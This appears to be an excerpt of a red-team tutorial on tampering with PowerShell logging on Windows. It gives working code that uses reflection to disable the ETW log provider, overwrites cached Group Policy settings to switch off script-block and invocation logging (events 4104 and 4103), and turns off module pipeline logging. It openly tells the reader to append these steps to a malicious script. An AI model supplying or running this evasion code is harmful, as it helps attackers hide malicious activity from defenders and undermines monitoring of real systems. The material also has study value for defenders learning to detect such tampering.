At step one, we need to obtain the type for the **PSEtwLogProvider** assembly. The assembly is stored in order to access its internal fields in the next step.
```
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
```
At step two, we are storing a value ($null) from the previous assembly to be used.
```
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
```
At step three, we compile our steps together to overwrite the m_enabled field with the value stored in the previous line.
```
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
```


### How to bypass Logs writing from GPO(LOG tampering)
```
At step one, we must use reflection to obtain the type of System.Management.Automation.Utils and identify the GPO cache field: cachedGroupPolicySettings.
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
```
At step two, we can leverage the GPO variable to modify either event provider setting to 0. **EnableScriptBlockLogging** will control **4104** **events**, limiting the visibility of script execution. Modification can be accomplished by writing to the object or registry directly.
```
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
```
At step three, we can repeat the previous step with any other provider settings we want to **EnableScriptBlockInvocationLogging** will control 4103 events, limiting the visibility of cmdlet and pipeline execution.
```
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
```
We can compile these steps together and append them to a malicious PowerShell script. Use the PowerShell script provided and experiment with this technique.


### How to bypass Logs writing from PowerShell Modules
(LOG tampering)
```
$module = Get-Module Microsoft.PowerShell.Utility # Get target module
$module.LogPipelineExecutionDetails = $false # Set module execution details to false
$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false
```
